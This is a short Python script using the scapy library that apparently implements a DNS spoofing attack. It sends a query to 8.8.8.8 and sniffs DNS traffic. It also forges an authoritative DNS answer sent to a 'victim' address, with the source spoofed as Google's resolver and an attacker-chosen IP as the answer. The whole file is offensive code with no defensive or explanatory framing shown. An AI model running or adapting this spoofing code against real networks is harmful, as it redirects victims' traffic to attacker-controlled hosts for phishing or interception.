import scapy.all as sc



def sendRequest(queryName, dns_id=sc.RandShort(), sourcePort=sc.RandShort()):
    
    dns_request = (
        sc.IP(dst="8.8.8.8") /
        sc.UDP(sport=sourcePort, dport=53) /
        sc.DNS(id=dns_id, rd=1, qd=sc.DNSQR(qname=queryName))
    )

    sc.send(dns_request)
    return dns_id, sourcePort
    # response = sc.sr1(dns_request, verbose=0, timeout=2)

    # if response and response.haslayer(sc.DNS) and response[sc.DNS].id == dns_id:
    #     print("Matched response ID:", response[sc.DNS].id)
    #     print("Answer:", response[sc.DNS].an.rdata if response[sc.DNS].an else "No answer")
    # else:
    #     print("No matching response.")


def sniffResponses(handelingFunction):
    requests = sc.sniff(filter="udp port 53", prn=handelingFunction)



def sendResponse(victim_ip, victim_port, query_name, resloved_ip):

   dns_response = (
      sc.IP(dst=victim_ip, src="8.8.8.8") /  # Pretend to be from Google DNS
      sc.UDP(dport=victim_port, sport=53) /  # DNS server port
      sc.DNS(
         id=0xAAAA,  # Must match the query's ID in real cases
         qr=1,       # This is a response
         aa=1,       # Authoritative answer
         qd=sc.DNSQR(qname=query_name),
         an=sc.DNSRR(rrname=query_name, ttl=300, rdata=resloved_ip)
      )
   )
   sc.send(dns_response)